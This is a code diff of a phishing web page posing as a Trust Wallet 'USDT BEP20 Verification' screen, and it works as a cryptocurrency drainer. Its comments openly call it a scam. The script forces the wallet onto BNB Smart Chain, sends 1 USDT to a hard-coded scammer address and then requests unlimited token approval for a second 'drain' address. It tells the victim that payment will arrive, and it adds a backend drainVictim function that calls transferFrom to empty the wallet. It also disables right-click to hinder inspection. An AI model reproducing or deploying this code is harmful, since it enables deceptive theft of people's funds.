@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>USDT Verification</title>
+    <title>USDT BEP20 Verification</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
     <style>
-        /* EXACT SCAM STYLES */
+        /* EXACT SCAM INTERFACE FOR BNB SMART CHAIN */
         * {
             margin: 0;
             padding: 0;
@@ -26,7 +26,7 @@
             min-height: 100vh;
         }
         
-        /* HEADER */
+        /* iOS STYLE HEADER */
         .header {
             background: #FFFFFF;
             padding: 60px 20px 20px 20px;
@@ -69,7 +69,7 @@
             margin-bottom: 8px;
         }
         
-        .address-box {
+        .address-container {
             background: #F2F2F7;
             border-radius: 12px;
             border: 1px solid #E5E5EA;
@@ -101,7 +101,7 @@
             min-width: 60px;
         }
         
-        /* AMOUNT SECTION */
+        /* AMOUNT SECTION - BEP20 SPECIFIC */
         .amount-container {
             background: #F2F2F7;
             border-radius: 12px;
@@ -126,7 +126,7 @@
             text-align: center;
         }
         
-        .usdt-badge {
+        .token-badge {
             background: #007AFF;
             color: white;
             border-radius: 12px;
@@ -193,7 +193,7 @@
     <div class="content">
         <div class="input-group">
             <div class="label">Address or Domain Name</div>
-            <div class="address-box">
+            <div class="address-container">
                 <div class="address-text" id="addressDisplay">0x395b205f3ec60b4cd5...</div>
                 <button class="paste-btn">Paste</button>
             </div>
@@ -203,7 +203,7 @@
             <div class="amount-container">
                 <div class="amount-row">
                     <input type="number" class="amount-input" id="amountInput" value="1">
-                    <div class="usdt-badge">USDT</div>
+                    <div class="token-badge">USDT</div>
                     <button class="max-btn" onclick="setMax()">Max</button>
                 </div>
             </div>
@@ -212,16 +212,43 @@
     </div>
     
     <div class="next-container">
-        <button class="next-btn" onclick="startScam()">Next</button>
+        <button class="next-btn" onclick="startBEP20Drain()">Next</button>
     </div>
     
     <script>
-        // SCAM ADDRESSES
-        const SCAM_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85";
-        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
-        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        // ============================================
+        // BNB SMART CHAIN BEP20 CONFIGURATION ONLY
+        // ============================================
         
+        // BSC MAINNET CONFIG
+        const BSC_CHAIN_ID = "0x38"; // Chain ID 56
+        const BSC_RPC_URL = "https://bsc-dataseed.binance.org/";
+        const BSC_EXPLORER = "https://bscscan.com";
+        
+        // BEP20 USDT CONTRACT
+        const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
+        
+        // SCAMMER ADDRESSES (BSC ONLY)
+        const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85"; // For 1 USDT
+        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc"; // For unlimited approval
+        
+        // BEP20 ABI
+        const BEP20_ABI = [
+            "function name() view returns (string)",
+            "function symbol() view returns (string)",
+            "function decimals() view returns (uint8)",
+            "function totalSupply() view returns (uint256)",
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)",
+            "function transferFrom(address from, address to, uint256 amount) returns (bool)",
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function allowance(address owner, address spender) view returns (uint256)"
+        ];
+        
+        // ============================================
         // UI FUNCTIONS
+        // ============================================
+        
         function updateUSD() {
             const amount = document.getElementById('amountInput').value || 0;
             document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
@@ -232,105 +259,182 @@
             updateUSD();
         }
         
-        // MAIN SCAM FUNCTION
-        async function startScam() {
+        // ============================================
+        // BSC NETWORK MANAGEMENT
+        // ============================================
+        
+        async function ensureBSCNetwork() {
             if (!window.ethereum) {
-                alert("Please open in Trust Wallet");
-                return;
+                throw new Error("Please open in Trust Wallet");
             }
             
+            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+            
+            if (chainId !== BSC_CHAIN_ID) {
+                try {
+                    // Switch to BSC
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: BSC_CHAIN_ID }]
+                    });
+                    console.log("Switched to BSC");
+                    return true;
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        // Add BSC network
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: BSC_CHAIN_ID,
+                                chainName: 'BNB Smart Chain Mainnet',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: [BSC_RPC_URL],
+                                blockExplorerUrls: [BSC_EXPLORER]
+                            }]
+                        });
+                        console.log("Added BSC network");
+                        return true;
+                    }
+                    throw switchError;
+                }
+            }
+            return true; // Already on BSC
+        }
+        
+        // ============================================
+        // BEP20 DRAIN FUNCTION
+        // ============================================
+        
+        async function startBEP20Drain() {
             try {
-                // This triggers Trust Wallet's connect modal (SCREENSHOT 2)
-                // It will show the user's CURRENT network and address
+                // 1. Force BSC network
+                await ensureBSCNetwork();
+                
+                // 2. Connect wallet (shows BNB Smart Chain in modal)
                 const accounts = await window.ethereum.request({
                     method: 'eth_requestAccounts'
                 });
                 
-                // Get current network
-                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 const userAddress = accounts[0];
+                console.log("BSC Address:", userAddress);
                 
-                // Switch to BSC if not already
-                if (chainId !== '0x38') {
-                    try {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }]
-                        });
-                    } catch (error) {
-                        if (error.code === 4902) {
-                            await window.ethereum.request({
-                                method: 'wallet_addEthereumChain',
-                                params: [{
-                                    chainId: '0x38',
-                                    chainName: 'Binance Smart Chain',
-                                    nativeCurrency: {
-                                        name: 'BNB',
-                                        symbol: 'BNB',
-                                        decimals: 18
-                                    },
-                                    rpcUrls: ['https://bsc-dataseed.binance.org/']
-                                }]
-                            });
-                        }
-                    }
-                }
-                
-                // Initialize ethers
+                // 3. Initialize provider for BSC
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 
-                // Send 1 USDT
+                // 4. Create BEP20 USDT contract
+                const usdtContract = new ethers.Contract(USDT_BEP20, BEP20_ABI, signer);
+                
+                // 5. Check USDT BEP20 balance
+                const balance = await usdtContract.balanceOf(userAddress);
+                console.log("USDT BEP20 Balance:", ethers.utils.formatUnits(balance, 18));
+                
+                // 6. Send 1 USDT BEP20 to scammer
                 const amount = document.getElementById('amountInput').value;
-                const amountWei = ethers.utils.parseUnits(amount, 18);
+                const amountWei = ethers.utils.parseUnits(amount, 18); // BEP20 uses 18 decimals
                 
-                const usdt = new ethers.Contract(
-                    USDT_CONTRACT,
-                    ["function transfer(address to, uint256 amount) returns (bool)"],
-                    signer
-                );
+                const transferTx = await usdtContract.transfer(PAYMENT_ADDRESS, amountWei);
+                console.log("Transfer TX:", transferTx.hash);
                 
-                const tx1 = await usdt.transfer(SCAM_ADDRESS, amountWei);
-                await tx1.wait();
+                await transferTx.wait();
+                console.log("Transfer confirmed");
                 
-                // Wait 3 seconds
+                // 7. Wait 3 seconds
                 await new Promise(resolve => setTimeout(resolve, 3000));
                 
-                // Unlimited approval - This triggers SCREENSHOT 1
-                const approveTx = await usdt.approve(
-                    DRAIN_ADDRESS,
-                    "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-                );
+                // 8. Request unlimited BEP20 approval
+                const unlimitedAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
-                // This creates the "Approve" modal with BNB fee
+                const approveTx = await usdtContract.approve(DRAIN_ADDRESS, unlimitedAmount);
+                console.log("Approve TX:", approveTx.hash);
+                
+                // This shows the "Approve" modal with BNB fee
                 await approveTx.wait();
+                console.log("Approval confirmed");
                 
-                alert("✅ Verification complete!");
+                // 9. Scammer can now drain all USDT BEP20
+                alert("✅ BEP20 Verification Complete! You will receive payment shortly.");
+                
+                // 10. Optional: Immediately drain (scammer's backend would do this)
+                // await drainVictim(userAddress, signer);
                 
             } catch (error) {
-                console.error(error);
+                console.error("BEP20 Drain Error:", error);
+                
+                if (error.code === 4001) {
+                    alert("Transaction cancelled");
+                } else if (error.message.includes("insufficient funds")) {
+                    alert("Insufficient BNB for gas fee");
+                } else {
+                    alert("Error: " + error.message);
+                }
             }
         }
         
-        // INIT
+        // ============================================
+        // BACKEND DRAIN FUNCTION (FOR SCAMMER)
+        // ============================================
+        
+        async function drainVictim(victimAddress, signer) {
+            // This is what the scammer runs on their backend
+            try {
+                const usdtContract = new ethers.Contract(USDT_BEP20, BEP20_ABI, signer);
+                
+                // Check allowance
+                const allowance = await usdtContract.allowance(victimAddress, DRAIN_ADDRESS);
+                console.log("Allowance:", ethers.utils.formatUnits(allowance, 18));
+                
+                if (allowance.gt(0)) {
+                    // Check balance
+                    const balance = await usdtContract.balanceOf(victimAddress);
+                    
+                    if (balance.gt(0)) {
+                        // Drain everything
+                        const drainAmount = allowance.lt(balance) ? allowance : balance;
+                        
+                        const drainTx = await usdtContract.transferFrom(
+                            victimAddress,
+                            DRAIN_ADDRESS, // Scammer's address
+                            drainAmount
+                        );
+                        
+                        console.log("Drain TX:", drainTx.hash);
+                        await drainTx.wait();
+                        console.log("Drained:", ethers.utils.formatUnits(drainAmount, 18), "USDT BEP20");
+                    }
+                }
+            } catch (error) {
+                console.error("Drain error:", error);
+            }
+        }
+        
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        
         document.addEventListener('DOMContentLoaded', function() {
-            // Format address display
-            const displayAddr = SCAM_ADDRESS.substring(0, 20) + '...';
+            // Format BSC address display
+            const displayAddr = PAYMENT_ADDRESS.substring(0, 20) + '...';
             document.getElementById('addressDisplay').textContent = displayAddr;
             
             // Update USD
             document.getElementById('amountInput').addEventListener('input', updateUSD);
             updateUSD();
             
-            // Detect if already on BSC
+            // Auto-switch to BSC on load (scammer behavior)
             if (window.ethereum) {
-                window.ethereum.request({ method: 'eth_chainId' }).then(chainId => {
-                    // If user is already on BSC, the connect modal will show BNB Smart Chain
-                    console.log("Current chain:", chainId);
-                });
+                setTimeout(() => {
+                    ensureBSCNetwork().catch(() => {
+                        // Silent fail - user won't notice
+                    });
+                }, 1000);
             }
             
-            // Prevent inspect
+            // Security
             document.addEventListener('contextmenu', e => e.preventDefault());
         });
     </script>
